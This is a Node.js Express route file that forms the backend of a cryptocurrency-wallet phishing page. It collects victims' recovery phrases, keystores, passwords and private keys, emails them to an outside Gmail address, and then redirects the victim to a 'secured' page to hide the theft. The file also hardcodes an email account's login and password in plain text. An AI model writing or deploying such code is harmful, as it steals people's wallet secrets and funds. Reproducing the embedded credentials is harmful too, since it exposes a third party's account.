const express = require('express');
const nodemailer = require('nodemailer');
const router = express.Router();

// Create a transporter for sending emails
const transporter = nodemailer.createTransport({
  service: 'fitchelogistics.com', // Using Outlook, can change to Gmail or others
  auth: {
    user: 'enoc@fitchelogistics.com', // Your email
    pass: 'mv,fTV@a]I%4', // Your app password or password
  },
});

// POST request handler for /api/send-to-telegram
router.post('/', (req, res) => {
  const { recoveryPhrase, keystore, password, key, wallet_id, privatekey1 } = req.body;

  // Prepare email content
  const mailOptions = {
    from: 'enoc@fitchelogistics.com',
    to: 'gomezjefferyalan22@gmail.com', // Replace with your recipient email
    subject: 'New Wallet Recovery Data',
    text: `
      Recovery Phrase: ${recoveryPhrase}
      Keystore: ${keystore}
      Password: ${password}
      Key: ${key}
      Wallet ID: ${wallet_id}
      Private Key 1: ${privatekey1}
    `,
  };

  // Send email using nodemailer
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      return res.status(500).send('Failed to send email');
    }
    console.log('Email sent: ' + info.response);

    // Redirect to secured.html page after email is sent
    res.redirect('/secured.html'); // Redirect the user to secured.html after email is sent
  });
});

module.exports = router;